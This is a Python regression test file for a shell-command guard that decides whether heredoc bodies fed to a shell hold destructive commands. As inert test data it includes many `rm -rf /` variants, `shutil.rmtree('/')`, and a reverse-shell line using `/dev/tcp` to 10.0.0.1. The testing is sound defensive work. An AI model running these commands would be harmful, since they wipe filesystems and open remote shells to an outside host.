"""Regression tests for the shell-fed-heredoc guard boundary.

Covers the narrow fix in _guard_hit: the `sh <<EOF` rescan now uses the
collected heredoc body (skeletonized) instead of the raw command, and the
producer detection no longer matches shell names inside file names.

All command strings are inert test data — nothing is executed.
"""
from __future__ import annotations

import importlib.util
import unittest
from pathlib import Path

SCRIPT = (Path(__file__).parents[1] / "src" / "security"
          / "jev-reviewer.py")
SPEC = importlib.util.spec_from_file_location(
    "jev_payload_boundaries_under_test", SCRIPT)
assert SPEC is not None and SPEC.loader is not None
jev = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(jev)


class TestFilenameShellWord(unittest.TestCase):
    """db-286 family: `bash` inside a file name is not an interpreter."""

    def test_286_real_command_shape(self) -> None:
        # Trimmed shape of the real command: append markdown via quoted
        # heredoc to a file whose name contains "bash".
        cmd = (
            "cat >> bash-classifier-exploits.md <<'EXPLOITS'\n"
            "\n"
            "notes: `bash -i >& /dev/tcp/10.0.0.1/4444` is a floor example\n"
            "and `rm -rf /` is another denied sample\n"
            "EXPLOITS\n"
            "echo appended; wc -l bash-classifier-exploits.md"
        )
        self.assertIsNone(jev._guard_hit(cmd, armed=set()))

    def test_shellish_filename_variants(self) -> None:
        for name in ("bash-classifier.md", "my-sh-notes.txt",
                     "dash.conf", "kshrc.bak", "foo-sh", "run.sh"):
            cmd = f"cat >> {name} <<'EOF'\nbash -i >& /dev/tcp/h/1\nEOF"
            self.assertIsNone(jev._guard_hit(cmd, armed=set()), name)

    def test_shell_name_as_data_argument_is_not_a_feed(self) -> None:
        # `cat bash` / `printf '%s' bash`: the shell name is argv data to
        # a non-shell producer — the heredoc body is still stored/read
        # data, not a program. Only the stage's command word may feed.
        for cmd in (
            "cat bash <<'E'\nrm -rf /\nE",
            "cat sh <<'E'\nrm -rf /\nE",
            "printf '%s' bash <<'E'\nrm -rf /\nE",
            "grep sh <<'E'\nrm -rf /\nE",
            "wc bash <<'E'\nrm -rf /\nE",
        ):
            self.assertIsNone(jev._guard_hit(cmd, armed=set()), cmd)


class TestShellFedBodyRescan(unittest.TestCase):
    """Only bodies actually fed to a shell are rescanned, skeletonized."""

    def test_inert_quoted_payload_inside_fed_body(self) -> None:
        # The body IS a program, but echoing a quoted string is inert.
        self.assertIsNone(jev._guard_hit(
            "sh <<EOF\necho 'rm -rf /'\nEOF", armed=set()))
        self.assertIsNone(jev._guard_hit(
            "bash <<'EOF'\necho 'rm -rf ~'\nEOF", armed=set()))

    def test_inert_payload_in_later_segment(self) -> None:
        # The old raw rescan flagged payloads in unrelated segments.
        self.assertIsNone(jev._guard_hit(
            "sh <<EOF\necho ok\nEOF\necho 'git reset --hard' > notes.txt",
            armed=set()))

    def test_real_destructive_body_still_denied(self) -> None:
        for cmd in (
            "sh <<EOF\nrm -rf /\nEOF",
            "bash <<EOF\nrm -rf /\nEOF",
            "sh <<'EOF'\nrm -rf /\nEOF",          # quoted tag: same program
            "bash <<-EOF\n\trm -rf /\n\tEOF",    # <<- tab-stripped marker
            "/bin/bash <<EOF\nrm -rf /\nEOF",    # path-qualified shell
            "sudo bash <<EOF\nrm -rf /\nEOF",
            "sudo --user root bash <<EOF\nrm -rf /\nEOF",
            "sudo --user=root bash <<EOF\nrm -rf /\nEOF",
            "env bash <<EOF\nrm -rf /\nEOF",
            "env --chdir /tmp bash <<EOF\nrm -rf /\nEOF",
            "timeout 30 bash <<EOF\nrm -rf /\nEOF",
            "timeout --signal TERM 30 bash <<EOF\nrm -rf /\nEOF",
            "2>/dev/null bash <<EOF\nrm -rf /\nEOF",
            "(sh <<EOF\nrm -rf /\nEOF)",          # subshell feed
            "sudo -u root bash <<EOF\nrm -rf /\nEOF",
            "env -i PATH=/bin bash <<EOF\nrm -rf /\nEOF",
            "timeout 30 bash -s <<EOF\nrm -rf /\nEOF",
            "sh>log.txt <<EOF\nrm -rf /\nEOF",    # inline redir on head
            "xargs sh <<EOF\nrm -rf /\nEOF",      # conservative: wrapper
        ):
            self.assertIsNotNone(jev._guard_hit(cmd, armed=set()), cmd)

    def test_piped_to_shell(self) -> None:
        # Passthrough producer piping the body into a shell.
        for cmd in (
            "cat <<EOF | sh\nrm -rf /\nEOF",
            "cat <<EOF | sudo bash\nrm -rf /\nEOF",
            "cat <<EOF | sh -s\nrm -rf /\nEOF",
            "cat <<EOF | timeout 30 bash -s\nrm -rf /\nEOF",
            "cat <<EOF | /bin/sh\nrm -rf /\nEOF",
        ):
            self.assertIsNotNone(jev._guard_hit(cmd, armed=set()), cmd)
        # Non-passthrough producer + shell consumer is not a feed (wc
        # emits a count, not the body).
        self.assertIsNone(jev._guard_hit(
            "wc -l <<EOF | sh\nrm -rf /\nEOF", armed=set()))

    def test_non_shell_producer_body_is_data(self) -> None:
        for cmd in (
            "cat <<EOF\nrm -rf /\nEOF",
            "cat > /tmp/x.sh <<'EOF'\nrm -rf /\nEOF",
            "cat <<EOF | grep rm\nrm -rf /\nEOF",
            "python3 <<EOF\nimport shutil; shutil.rmtree('/')\nEOF",
        ):
            self.assertIsNone(jev._guard_hit(cmd, armed=set()), cmd)

    def test_unquoted_body_substitutions_stay_live(self) -> None:
        # The skeleton marks $(...) inside an unquoted heredoc with a
        # placeholder (expansion runs before the write) — the substitution
        # stays visible to scans instead of disappearing with the body.
        skel = jev._command_skeleton(
            "cat > f.sh <<EOF\n$(id)\nEOF")
        self.assertTrue(skel.count("\x00") >= 2, skel)
        # Quoted tag freezes it: a substitution written to a fixture is
        # inert text.
        self.assertIsNone(jev._guard_hit(
            "cat > f.sh <<'EOF'\n$(rm -rf /)\nEOF", armed=set()))
        # But inside a shell-FED body, `$(...)` is program text the shell
        # expands at runtime — the body rescan must see it.
        self.assertIsNotNone(jev._guard_hit(
            "sh <<'EOF'\n$(rm -rf /)\nEOF", armed=set()))
        self.assertIsNotNone(jev._guard_hit(
            "sh <<EOF\n$(rm -rf /)\nEOF", armed=set()))

    def test_armed_lift_still_applies(self) -> None:
        # rm -rf ~ inside a fed body is filesystem-cat — lifted when armed.
        hit = jev._guard_hit("sh <<EOF\nrm -rf ~\nEOF", armed=set())
        self.assertIsNotNone(hit)
        lifted: list = []
        self.assertIsNone(jev._guard_hit(
            "sh <<EOF\nrm -rf ~\nEOF", armed={"filesystem"},
            lifted=lifted))
        # Floor hits inside fed bodies can never be lifted.
        self.assertIsNotNone(jev._guard_hit(
            "sh <<EOF\nrm -rf /\nEOF", armed={"filesystem"}))

    def test_executed_quotes_inside_shell_body_stay_live(self) -> None:
        for body in ("eval 'rm -rf /'", "sh -c 'rm -rf /'",
                     "bash <<'INNER'\nrm -rf /\nINNER"):
            command = "sh <<'OUTER'\n" + body + "\nOUTER"
            self.assertIsNotNone(jev._guard_hit(command), body)
        self.assertIsNone(jev._guard_hit(
            "sh <<'OUTER'\necho 'rm -rf /'\nOUTER"))

    def test_control_flow_and_unknown_wrappers_keep_floor_coverage(self) -> None:
        commands = [
            "if true; then sh <<'E'\nrm -rf /\nE\nfi",
            "while true; do sh <<'E'\nrm -rf /\nE\nbreak; done",
            "{ sh <<'E'\nrm -rf /\nE\n}",
            "taskset 1 sh <<'E'\nrm -rf /\nE",
            "taskset 0xff sh <<'E'\nrm -rf /\nE",
            "chpst sh <<'E'\nrm -rf /\nE",
            "custom-wrapper sh <<'E'\nrm -rf /\nE",
        ]
        for command in commands:
            with self.subTest(command=command):
                self.assertIsNotNone(jev._guard_hit(command))
        for consumer in ("cat sh", "cat bash", "printf '%s' bash", "grep sh"):
            command = consumer + " <<'E'\nrm -rf /\nE"
            self.assertIsNone(jev._guard_hit(command), consumer)

    def test_shell_body_rescan_has_a_conservative_recursion_bound(self) -> None:
        body = "rm -rf /"
        for depth in range(10):
            tag = f"LAYER_{depth}"
            body = f"sh <<'{tag}'\n{body}\n{tag}"
        self.assertIsNotNone(jev._guard_hit(body))


class TestFallbackRescan(unittest.TestCase):
    """Unparsed `<<` surfaces keep the previous raw rescan — no ALLOW
    shortcut for shapes the collector cannot map."""

    def test_herestring_fed_to_shell(self) -> None:
        # <<< has no body span; sh still executes the literal — must hit.
        self.assertIsNotNone(jev._guard_hit(
            "sh <<<'rm -rf /'", armed=set()))
        # Herestring to a non-shell is inert data.
        self.assertIsNone(jev._guard_hit(
            "cat <<<'rm -rf /'", armed=set()))

    def test_nested_heredoc_in_substitution(self) -> None:
        # `$(sh <<EOF ... EOF)` bodies never reach the collector — the
        # fallback must still see the fed shell.
        cmd = "X=$(sh <<EOF\nrm -rf /\nEOF\n); echo $X"
        self.assertIsNotNone(jev._guard_hit(cmd, armed=set()))
        # Same nesting with a non-shell producer stays inert.
        cmd = "X=$(cat <<EOF\nrm -rf /\nEOF\n); echo $X"
        self.assertIsNone(jev._guard_hit(cmd, armed=set()))


class TestWriteThenExecUnchanged(unittest.TestCase):
    """The accident-scan write-then-exec path is unaffected."""

    def test_write_then_exec_still_denied(self) -> None:
        cmd = "cat > /tmp/x.sh <<EOF\nrm -rf /\nEOF\nbash /tmp/x.sh"
        self.assertIsNotNone(jev._guard_hit(cmd, armed=set()))
        self.assertIsNone(jev._guard_hit(
            "cat > /tmp/x.sh <<EOF\nrm -rf /\nEOF", armed=set()))


if __name__ == "__main__":
    unittest.main()
